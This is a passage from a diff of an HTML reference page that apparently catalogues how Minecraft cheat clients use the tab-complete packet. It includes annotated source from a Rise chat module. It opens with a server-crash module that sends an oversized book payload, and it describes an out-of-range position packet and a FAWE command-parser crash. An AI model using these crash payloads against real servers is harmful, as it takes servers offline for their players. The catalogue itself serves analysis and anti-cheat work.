ext:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}"));
+                }
+
+                tag.setString("author", RandomStringUtils.random(16, "0123456789"));
+                tag.setString("title", RandomStringUtils.random(16, "0123456789"));
+                tag.setByte("resolved", (byte) 1);
+                tag.setTag("pages", list);
+                final ItemStack book = new ItemStack(Items.writable_book);
+                book.setTagCompound(tag);
+                final PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
+                buffer.writeItemStackToBuffer(book);
+                PacketUtil.sendPacket(new C17PacketCustomPayload("MC|BEdit", buffer));
+                break;
+            }
+
+            case "AAC5": {
+                PacketUtil.sendPacket(new C03PacketPlayer.C04PacketPlayerPosition(1.7E301, -999, 0, true));
+                break;
+            }
+        }
+    }
+}
+// NOTE (AI): FAWE mode sends a C14 whose message is a deeply nested '/to for(i=0;i&lt;256;i++){...}' command string aimed at the FastAsyncWorldEdit command parser. The packet is sent with sendPacketWithoutEvent every tick. The tab-complete handler itself is cheap; the kill is the server-side completion of a pathological command string.</code></div><button class="code-expand-btn" onclick="var w=this.parentNode;w.classList.toggle('collapsed');w.classList.toggle('expanded');this.querySelector('.expand-label').textContent=w.classList.contains('collapsed')?'Show more':'Show less'"><svg class="expand-icon-collapsed" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg><svg class="expand-icon-expanded" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="18 15 12 9 6 15"/></svg><span class="expand-label">Show more</span></button></div>
+<div class="impl-meta"><span><strong>Vanilla hook:</strong> onPreMotion (PreMotionEvent).</span></div>
+<div class="impl-meta" style="color:var(--orange);margin-top:4px"><span>Targets a plugin parser, not the anti-cheat; a patched FAWE just returns an error message. The one-packet-per-tick rate is unremarkable.</span></div>
+<div class="impl-meta" style="margin-top:4px"><span><strong>Variations:</strong> No equivalent tab-complete crash in the other 7 clients.</span></div>
+</div>
+<div class="impl-module-entry"><div class="impl-module-header"><span class="impl-module-name">Chat (custom tab complete)</span>
+<span class="impl-module-clients">(Rise 6.1.30, Rise 6.2.4)</span>
+</div>
+<p class="impl-pattern">Drive the custom chat GUI's tab completion through C14 with a block position.</p>
+<p class="impl-pattern" style="font-size:0.8rem;color:var(--text-muted)">The Chat module intercepts the tab key and sends C14PacketTabComplete(text, blockpos) via the vanilla send queue, then renders the S3A response in its own completion UI.</p>
+<p class="impl-meta" style="font-size:0.75rem"><span><strong>Source:</strong> Rise 6.2.4 — Client-release2/Client/src/main/java/com/alan/clients/module/impl/render/chat/Chat.java</span></p>
+<div class="impl-code-wrap collapsed"><div class="impl-code"><code>// ===== FILE: Rise 6.2.4 — Client-release2/Client/src/main/java/com/alan/clients/module/impl/render/chat/Chat.java =====
+package com.alan.clients.module.impl.render.chat;
+
+import com.alan.clients.event.Listener;
+import com.alan.clients.event.annotations.EventLink;
+import com.alan.clients.event.impl.input.GuiKeyBoardEvent;
+import com.alan.clients.event.impl.input.KeyboardInputEvent;
+import com.alan.clients.event.impl.packet.PacketReceiveEvent;
+import com.alan.clients.event.impl.render.Render2DEvent;
+import com.alan.clients.font.Fonts;
+import com.alan.clients.font.Weight;
+import com.alan.clients.module.Module;
+import com.alan.clients.module.api.Category;
+import com.alan.clients.module.api.ModuleInfo;
+import com.alan.clients.module.impl.render.Interface;
+import com.alan.clients.ui.theme.Themes;
+import com.alan.clients.util.EvictingList;
+import com.alan.clients.util.MouseUtil;
+import com.alan.clients.util.animation.Animation;
+import com.alan.clients.util.animation.Easing;
+import com.alan.clients.util.chat.ChatUtil;
+import com.alan.clients.util.font.Font;
+import com.alan.clients.util.gui.ScrollUtil;
+import com.alan.clients.util.gui.textbox.TextAlign;
+import com.alan.clients.util.gui.textbox.TextBox;
+import com.alan.clients.util.render.ColorUtil;
+import com.alan.clients.util.render.RenderUtil;
+import com.alan.clients.util.vector.Vector2d;
+import com.alan.clients.value.impl.BooleanValue;
+import com.alan.clients.value.impl.DragValue;
+import com.alan.clients.value.impl.NumberValue;
+import lombok.Getter;
+import net.minecraft.client.gui.ChatLine;
+import net.minecraft.client.renderer.GlStateManager;
+import net.minecraft.network.Packet;
+import net.minecraft.network.play.client.C14PacketTabComplete;
+import net.minecraft.network.play.server.S3APacketTabComplete;
+import net.minecraft.util.BlockPos;
+import net.minecraft.util.EnumChatFormatting;
+import net.minecraft.util.IChatComponent;
+import net.minecraft.util.MovingObjectPosition;
+import net.optifine.gui.GuiChatOF;
+import org.lwjgl.input.Mouse;
+import org.lwjgl.opengl.GL11;
+import rip.vantage.commons.util.time.StopWatch;
+
+import java.awt.*;
+import java.util.ArrayList;
+import java.util.Arrays;
+import java.util.Collections;
+import java.util.List;
+
+import static com.alan.clients.layer.Layers.*;
+import static com.alan.clients.util.animation.Easing.*;
+
+@Getter
+@ModuleInfo(aliases = {"module.render.chat.name"}, description = "module.render.chat.description", category = Category.RENDER, autoEnabled = true, allowDisable = false)
+public final class Chat extends Module {
+    private final NumberValue openHeight = new NumberValue("Open Height", this, 130, 0, 200, 1);
+    private final NumberValue widthChat = new NumberValue("Width", this, 320, 40, 320, 1);
+
+    private final NumberValue closedHeight = new NumberValue("Max Closed Height", this, 130, 0, 500, 1);
+    private final NumberValue disappear = new NumberValue("Message disappearance speed", this, 5000, 0, 5000, 1);
+    private final BooleanValue background = new BooleanValue("Background", this, true);
+    private final BooleanValue hidePlayers = new BooleanValue("Hide Player Source Messages", this, false);
+
+    private final DragValue structure = new DragValue("", this, new Vector2d(200, 200), false, true);
+    private final Animation animation = new Animation(Easing.EASE_OUT_EXPO, 500);
+    private final Animation inputAnimation = new Animation(Easing.EASE_OUT_ELASTIC, 400);
+    private final Animation inputOpacity = new Animation(LINEAR, 400);
+    private final Animation scaleAnimation = new Animation(EASE_OUT_EXPO, 500);
+    private final ScrollUtil scroll = new ScrollUtil();
+
+    private final Font chatFont = mc.fontRendererObj;
+    private final Font inputFont = mc.fontRendererObj;
+
+    private TextBox textField = new TextBox(new Vector2d(0, 0), inputFont, Color.WHITE, TextAlign.LEFT, "", 1000f, "abcdefghijklmnopqrstuvwxyz1234567890!@#$%^&amp;*()-_+=[{]};:.&gt;,&lt;/?|  ' \" ` ~");
+    private int lineCount, recentLineCount;
+    private float lineHeight;
+    public boolean clicked, open;
+    private StopWatch stopWatch = new StopWatch();
+    private EvictingList&lt;String&gt; recentMessages = new EvictingList&lt;&gt;(20);
+    private ArrayList&lt;String&gt; matches;
+    private Interface interfaceModule;
+
+    public Chat() {
+        mc.ingameGUI.persistantChatGUI = new RiseGuiNewChat(mc);
+    }
+
+    @EventLink
+    public final Listener&lt;KeyboardInputEvent&gt; onKey = event -&gt; {
+        if (event.getCharacter() == '/' || event.getCharacter() == '.') {
+            textField.setSelected(true);
+            textField.key(event.getCharacter(), event.getKeyCode());
+        }
+    };
+
+    @EventLink
+    public final Listener&lt;PacketReceiveEvent&gt; onPacketReceive = event -&gt; {
+        Packet&lt;?&gt; packet = event.getPacket();
+
+        if (packet instanceof S3APacketTabComplete) {
+            matches = new ArrayList&lt;&gt;(Arrays.asList(((S3APacketTabComplete) packet).getMatches()));
+
+            for (String match : matches) ChatUtil.display(match);
+        }
+    };
+
+    @EventLink
+    public final Listener&lt;GuiKeyBoardEvent&gt; onGuiKey = event -&gt; {
+        switch (event.getKeyCode()) {
+            // Enter
+            case 28:
+                if (textField.getText().isEmpty()) return;
+                mc.thePlayer.sendChatMessage(textField.getText());
+                recentMessages.remove(textField.getText());
+                recentMessages.add(textField.getText());
+                textField.text = "";
+                mc.displayGuiScreen(null);
+                break;
+
+            // Down arrow
+            case 200:
+                List&lt;String&gt; recentMessages = new ArrayList&lt;&gt;(this.recentMessages);
+                Collections.reverse(recentMessages);
+                int index = recentMessages.indexOf(textField.text);
+                if (recentMessages.size() &gt; index + 1) {
+                    textField.text = recentMessages.get(index + 1);
+                    textField.cursor = textField.text.length();
+                }
+                break;
+
+            // Up Arrow
+            case 208:
+                List&lt;String&gt; recentMessages2 = new ArrayList&lt;&gt;(this.recentMessages);
+                Collections.reverse(recentMessages2);
+                int indexDown = recentMessages2.indexOf(textField.text);
+                if (indexDown &gt; 0) {
+                    textField.text = recentMessages2.get(indexDown - 1);
+                    textField.cursor = textField.text.length();
+                }
+                break;
+
+            // Tab
+            case 15:
+                if (matches == null) {
+                    String text = getTextField().getText();
+                    if (!text.startsWith(".") &amp;&amp; !text.isEmpty()) { // !p_146405_1_.startsWith(".") added to prevent autocomplete of commands
+                        BlockPos blockpos = null;
+
+                        if (this.mc.objectMouseOver != null &amp;&amp; this.mc.objectMouseOver.typeOfHit == MovingObjectPosition.MovingObjectType.BLOCK) {
+                            blockpos = this.mc.objectMouseOver.getBlockPos();
+                        }
+
+                        this.mc.thePlayer.sendQueue.addToSendQueue(new C14PacketTabComplete(text, blockpos));
+                    }
+
+                    matches = new ArrayList&lt;&gt;();
+                } else if (!matches.isEmpty()) {
+                    String[] parts = textField.getText().split(" ");
+                    int indexof = matches.indexOf(parts[parts.length - 1]);
+
+                    parts[parts.length - 1] = matches.get((matches.size() &gt; indexof + 1) ? indexof + 1 : 0);
+                    textField.text = String.join(" ", parts);
+
+                    textField.cursor = textField.getText().length();
+                }
+                break;
+        }
+
+        textField.selected = open;
+        textField.key(event.getCharacter(), event.getKeyCode());
+    };
+
+    @EventLink
+    public final Listener&lt;Render2DEvent&gt; onRender2D = event -&gt; {
+        this.renderChat();
+
+        this.renderInput();
+    };
+
+    public void renderChat() {
+        getTheme();
+        if (interfaceModule == null) interfaceModule = getModule(Interface.class);
+        boolean rise = interfaceModule.getInformationType().getValue().getName().equals("Rise");
+
+        open = mc.currentScreen instanceof GuiChatOF;
+        lineHeight = chatFont.height();
+
+        float expandedHeight = Math.min((open ? openHeight : closedHeight).getValue().intValue(), lineHeight * lineCount + (lineCount == 0 ? 0 : 7));
+
+        scaleAnimation.run(Math.min(expandedHeight, (lineHeight * (open ? expandedHeight : recentLineCount)) + (lineHeight * (open ? expandedHeight : recentLineCount) == 0 ? 0 : 7)));
+        structure.scale = new Vector2d(widthChat.getValue().doubleValue(), scaleAnimation.getValue());
+
+        structure.position = new Vector2d(getTheme().getPadding(), mc.scaledResolution.getScaledHeight() - 10 - 20 - structure.scale.y);
+        Vector2d position = new Vector2d(structure.position.x + 5, structure.position.y + structure.scale.y - 1.5);
+        Vector2d startPosition = new Vector2d(position.getX(), position.getY());
+        List&lt;ChatLine&gt; lines = new ArrayList&lt;&gt;(mc.ingameGUI.getChatGUI().drawnChatLines);
+
+        double round = Math.min(structure.scale.y / 5f, 6);
+
+        if (background.getValue()) {
+            if (rise) {
+                getLayer(REGULAR, 1).add(() -&gt; RenderUtil.roundedRectangle(structure.position.x, structure.position.y, structure.scale.x, structure.scale.y, round, Themes.getBackgroundShade()));
+                getLayer(BLOOM).add(() -&gt; RenderUtil.roundedRectangle(structure.position.x + 1, structure.position.y + 1, structure.scale.x - 2, structure.scale.y - 2, round, getTheme().getDropShadow()));
+                getLayer(BLUR).add(() -&gt; RenderUtil.roundedRectangle(structure.position.x, structure.position.y, structure.scale.x, structure.scale.y, round, Color.BLACK));
+            } else {
+                getLayer(REGULAR, 1).add(() -&gt; RenderUtil.rectangle(structure.position.x, structure.position.y, structure.scale.x, structure.scale.y, new Color(0, 0, 0, 130)));
+            }
+        }
+
+        // Chat
+        getLayer(REGULAR, 1).add(() -&gt; {
+            GL11.glEnable(GL11.GL_SCISSOR_TEST);
+            RenderUtil.scissor(structure.position.x, structure.position.y, structure.scale.x, structure.scale.y);
+
+            animation.run(0);
+            position.setY(position.getY() + animation.getValue() - scroll.getScroll());
+            scroll.onRender(open);
+            scroll.setReverse(true);
+            scroll.setMax((-lineHeight * lines.size()) + structure.scale.y - 6);
+
+            if (!open) scroll.setTarget(0);
+
+            if (lines.size() &gt; 150) {
+                List&lt;ChatLine&gt; linesPointer = mc.ingameGUI.getChatGUI().drawnChatLines;
+
+                while (linesPointer.size() &gt; 100) {
+                    linesPointer.remove(linesPointer.getLast());
+                }
+            }
+
+            update:
+            {
+                if (lineCount &lt; lines.size()) {
+                    if (hidePlayers.getValue()) {
+                        mc.ingameGUI.getChatGUI().drawnChatLines.removeIf(line -&gt; line.getChatComponent().getFormattedText().contains(":"));
+
+                        if (lineCount &gt;= mc.ingameGUI.getChatGUI().drawnChatLines.size()) {
+                            break update;
+                        }
+                    }
+                    animation.setValue(animation.getValue() + ((lines.size() - lineCount) * lineHeight));
+                    animation.run(animation.getValue());
+                    recentLineCount += lines.size() - lineCount;
+                    recentLineCount = (int) Math.max(Math.min((closedHeight.getValue().intValue() / lineHeight), recentLineCount), 0);
+                }
+            }
+
+            lineCount = lines.size();
+
+            if (stopWatch.finished(disappear.getValue().intValue()) || recentLineCount == 0) {
+                stopWatch.reset();
+                recentLineCount = Math.max(0, recentLineCount - 1);
+            }
+
+            IChatComponent chatComponent2 = null;
+
+            // Rendering chat
+            for (ChatLine chatLine : lines) {
+                position.setX(startPosition.getX());
+                position.setY(position.getY() - lineHeight);
+
+                if (position.y &lt; structure.position.y - lineHeight + (open ? 0 : 6) || position.y &gt; structure.position.y + structure.scale.y) {
+                    continue;
+                }
+
+                for (IChatComponent chatComponent : chatLine.getChatComponent()) {
+                    String text = chatComponent.getUnformattedTextForChat();
+                    EnumChatFormatting color = chatComponent.getChatStyle().getColor() == null ? EnumChatFormatting.RESET : chatComponent.getChatStyle().getColor();
+                    double componentWidth = chatFont.drawWithShadow(color + text, position.getX(), position.getY(), 16777215) - position.x;
+
+                    // Hover &amp; Click
+                    if (open &amp;&amp; MouseUtil.isHovered(position.x, position.y, componentWidth, lineHeight)) {
+                        chatComponent2 = chatComponent;
+                    }
+
+                    position.x += componentWidth;
+                }
+            }
+
+            if (chatComponent2 != null) {
+                Vector2d mouse = MouseUtil.mouse();
+                mc.currentScreen.handleComponentHover(chatComponent2, (int) mouse.getX(), (int) mouse.getY());
+                if (!clicked &amp;&amp; Mouse.isButtonDown(0)) mc.currentScreen.handleComponentClick(chatComponent2);
+                clicked = Mouse.isButtonDown(0);
+            }
+            // Scrollbar
+            if (background.getValue()) {
+                scroll.renderScrollBar(new Vector2d(structure.position.x + structure.scale.x - 5, structure.position.y + 5), structure.scale.y - 10);
+            }
+
+            // Scissoring
+            GL11.glDisable(GL11.GL_SCISSOR_TEST);
+        });
+    }
+
+    public void renderInput() {
+        getTheme();
+        boolean rise = interfaceModule.getInformationType().getValue().getName().equals("Rise");
+
+        // ChatBox
+        if (rise) {
+            inputAnimation.setDuration(!open ? 300 : 850);
+            inputAnimation.setEasing(!open ? EASE_IN_EXPO : EASE_OUT_ELASTIC);
+        } else {
+            inputAnimation.setDuration(0);
+            inputAnimation.setEasing(!open ? EASE_IN_EXPO : EASE_OUT_ELASTIC);
+        }
+        inputAnimation.run(!open ? 0 : 1);
+        inputOpacity.run(open ? 255 : 0);
+
+        double scale = (inputAnimation.getValue() &gt; 1) ? (1 + (inputAnimation.getValue() - 1) * 0.4) : inputAnimation.getValue();
+
+        textField.setEmptyText("");
+
+        if (inputAnimation.getValue() &lt;= 0) return;
+
+        Vector2d inputPosition = new Vector2d(getTheme().getPadding(), mc.scaledResolution.getScaledHeight() - getTheme().getPadding() - Fonts.MAIN.get(20, Weight.REGULAR).height() - 3);
+        Vector2d inputScale = new Vector2d(structure.scale.x, inputFont.height() + 7.5);
+
+        Runnable glOpen = () -&gt; {
+            GlStateManager.pushMatrix();
+            GlStateManager.translate((inputPosition.x + inputScale.x / 2) * (1 - scale), (inputPosition.y + inputScale.y / 2) * (1 - scale), 0);
+            GlStateManager.scale(scale, scale, 0);
+        };
+
+        if (rise) {
+            getLayer(REGULAR, 1).add(() -&gt; {
+                glOpen.run();
+                RenderUtil.roundedRectangle(inputPosition.x, inputPosition.y, inputScale.x, inputScale.y, 6, ColorUtil.withAlpha(Themes.getBackgroundShade(), Math.min((int) inputOpacity.getValue(), getTheme().getBackgroundShade().getAlpha())));
+
+                GlStateManager.popMatrix();
+            });
+
+            getLayer(BLOOM).add(() -&gt; {
+                glOpen.run();
+                RenderUtil.roundedRectangle(inputPosition.x, inputPosition.y, inputScale.x, inputScale.y, 6.5, getTheme().getDropShadow());
+                GlStateManager.popMatrix();
+            });
+
+            getLayer(BLUR).add(() -&gt; {
+                glOpen.run();
+                RenderUtil.roundedRectangle(inputPosition.x, inputPosition.y, inputScale.x, inputScale.y, 6, Color.BLACK);
+                GlStateManager.popMatrix();
+            });
+        } else {
+            getLayer(REGULAR, 1).add(() -&gt; {
+                glOpen.run();
+                RenderUtil.rectangle(inputPosition.x, inputPosition.y, inputScale.x, inputScale.y, new Color(0, 0, 0, Math.min((int) inputOpacity.getValue(), 130)));
+
+                GlStateManager.popMatrix();
+            });
+        }
+
+        textField.setColor(ColorUtil.withAlpha(Color.WHITE, (int) inputOpacity.getValue()));
+        textField.setFontRenderer(inputFont);
+        textField.setPosition(new Vector2d(getTheme().getPadding() + 5, mc.scaledResolution.getScaledHeight() - inputFont.height() - getTheme().getPadding()));
+
+        getLayer(REGULAR, 1).add(() -&gt; {
+            glOpen.run();
+            textField.draw();
+            GlStateManager.popMatrix();
+
+            if (!open) textField.text = "";
+        });
+
+        if (!open) {
+            textField.text = "";
+            matches = null;
+        }
+    }
+}
+// NOTE (AI): The Rise 6.x Chat module implements its own tab-complete UX: on the tab key it sends C14PacketTabComplete with the current text and the looked-at block position, then renders the S3A reply in its custom chat GUI instead of the vanilla completion dropdown. The corpus hit is at the addToSendQueue call; the module also rewrites the vanilla chat input handling.</code></div><button class="code-expand-btn" onclick="var w=this.parentNode;w.classList.toggle('collapsed');w.classList.toggle('expanded');this.querySelector('.expand-label').textContent=w.classList.contains('collapsed')?'Show more':'Show less'"><svg class="expand-icon-collapsed" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg><svg class="expand-icon-expanded" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="18 15 12 9 6 15"/></svg><span class="expand-label">Show more</span></button></div>
+<div class="impl-meta"><span><strong>Vanilla hook:</strong> Custom chat GUI key handler; no packet event hook on the send side.</span></div>
+<div class="impl-meta" style="color:var(--orange);margin-top:4px"><span>None; it mirrors vanilla completion behavior.</span></div>
+<div class="impl-meta" style="margin-top:4px"><span><strong>Variations:</strong> Same module file exists in Rise 6.1.30 with the identical send call.</span></div>
+</div>
+<div class="impl-meta" style="margin-top:8px;white-space:pre-wrap">S3APacketTabComplete is the receive-side hook for enumeration; the send side is direct construction (Rise 5.99, Sigma) or the vanilla send queue (Rise 6.x Chat).</div>
+<div class="impl-clients">Rise 5.99 and Sigma construct the packet directly; Rise 6.x Chat goes through mc.thePlayer.sendQueue.addToSendQueue. Tenacity's PacketUtil whitelist also classifies C14 as a client packet.</div>
+</div>
+<div class="detail-section"><h3>Related Packets</h3><div class="related-list">
+<a class="related-chip" href="../S3APacketTabComplete/">S3APacketTabComplete</a>
+<a class="related-chip" href="../C01PacketChatMessage/">C01PacketChatMessage</a>
+</div></div>
     </div>
     <div style="margin-top:32px;text-align:center">
       <a href="../../" style="color:var(--accent);font-size:0.85rem">← Back to all packets</a>
